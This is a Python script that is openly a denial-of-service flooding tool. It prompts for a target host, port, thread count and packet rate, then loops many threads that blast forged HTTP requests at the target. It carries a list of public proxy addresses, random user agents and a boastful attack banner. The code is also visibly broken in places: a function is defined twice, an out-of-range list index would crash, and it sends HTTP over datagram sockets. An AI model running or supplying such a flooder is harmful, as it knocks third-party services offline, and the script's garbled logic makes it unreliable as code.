import threading
import socket, requests
import time 
import random
import sys
useragents=["Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1","Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1","Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
"Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0",
"Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1",
"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2",
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0",
"Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0",
"Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1",
"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
"Mozilla/5.0 (Windows; U; ; en-NZ) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.8.0",
"Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.4) Gecko Netscape/7.1 (ax)",
"Mozilla/5.0 (Windows; U; Windows CE 5.1; rv:1.8.1a3) Gecko/20060610 Minimo/0.016"]
ref=['http://www.bing.com/search?q=',
'https://www.ndex.com/ndsearch?text=',
'https://duckduckgo.com/?q=']
socks5 = [""" 146.56.178.93:1711
        5.161.82.73:3128
        188.87.102.128:3128
        43.153.86.246:7890
        34.162.24.17:8585
        157.245.27.9:3128
        200.111.249.195:999
        177.234.192.45:32213
        110.238.109.146:808
        222.220.102.159:8000
        43.129.249.114:3128
        82.103.70.227:4145
        41.65.236.43:1981
        5.133.96.148:4153
        103.179.253.202:8181
        38.56.23.193:999
        194.182.169.100:80
        2.83.198.171:80
        45.90.216.207:8080
        103.178.42.29:8181
        1.212.157.114:4145
        161.35.37.92:3128
        35.236.207.242:33333"""]
print("DON'T LEAK MY DDOS, IF U NOT GET BACKDOOR!!")
ip = str(input("Target/t >>> ="))
port = int(input("Port/t >>> ="))
th = int(input("Thread/t >>> ="))
pack = int(input("Packs/s >>> ="))
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
def spoofer():
    global bypass
for x in range(2000):
    spoof = random.randint(0, 2888)
    spoof2 = random.randint(0, 15672)
    spoof3 = random.randint(0, 17721)
    spoof4 = random.randint(0, 28291)
    bypass = random._urandom(25550)
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    

def spoofer():
    addr = [192, 168, 0, 1]
    d = '.'
    addr[0] = str(random.randrange(11, 197))
    addr[2] = str(random.randrange(0, 255))
    addr[3] = str(random.randrange(0, 255))
    addr[4] = str(random.randrange(2, 254))
    acces =  addr[1] + d + addr[2] + d + addr[3] + d + addr[4]
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    return acces

def start():
    global socks5, ref, useragents
    global subjection
    subjection = random._urandom(45000)
    sockpeler  = "Sockets: "+random.choice(socks5)+random.choice(ref)+random.choice(useragents)+"\r\n"
    reffer     = random.choice(ref)
    userAdmin  = "Administrator: "+random.choice(useragents)+"\r\n"
    content    = "Content-Type: application/x-www-form-urlencoded\r\n"
    length     = "Content-Length: 0 \r\nConnection: Keep-Alive\r\n"
    target_host = "GET / HTTP/1.1\r\nHost: {0}:{1}\r\n".format(str(ip), int(port))
    bypass_inject = sockpeler + reffer + userAdmin + content + target_host + length + "\r\n"
    while True:
          try:
             s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
             s.connect((str(ip),int(port)))
             s.send(str.encode(bypass_inject))
             for pe in range(pack):
                 s.connect((str(ip),int(port)))
                 s.send(str.encode(bypass_inject))
                 print("Server Got Attack By Moon4k:)")
          except:
              pass
for y in range(th):
    th = threading.Thread(target=start)
    th.start()
             
